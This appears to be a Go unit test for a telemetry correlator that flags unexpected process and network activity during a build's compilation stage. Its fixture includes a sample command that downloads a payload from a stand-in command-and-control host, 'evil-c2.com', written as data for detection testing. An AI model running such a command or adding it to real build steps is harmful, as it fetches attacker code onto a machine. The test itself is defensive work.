package telemetry

import (
	"testing"
	"time"
)

func TestStageCorrelatorUnexpectedProcess(t *testing.T) {
	correlator := NewStageCorrelator()

	procs := []*ProcessEvent{
		{PID: 101, Name: "python.exe", CommandLine: "python -m pip install requests", Timestamp: time.Now()},
		{PID: 102, Name: "curl.exe", CommandLine: "curl https://evil-c2.com/payload.sh", Timestamp: time.Now()},
	}

	nets := []*NetworkEvent{
		{PID: 102, ProcessName: "curl.exe", Destination: "evil-c2.com", Port: 443, Timestamp: time.Now()},
	}

	report := correlator.CorrelateStage("compilation", procs, nets)

	if len(report.UnexpectedEvents) == 0 {
		t.Fatalf("expected unexpected process/network events flagged during compilation")
	}
	t.Logf("Detected %d unexpected events during compilation stage", len(report.UnexpectedEvents))
}
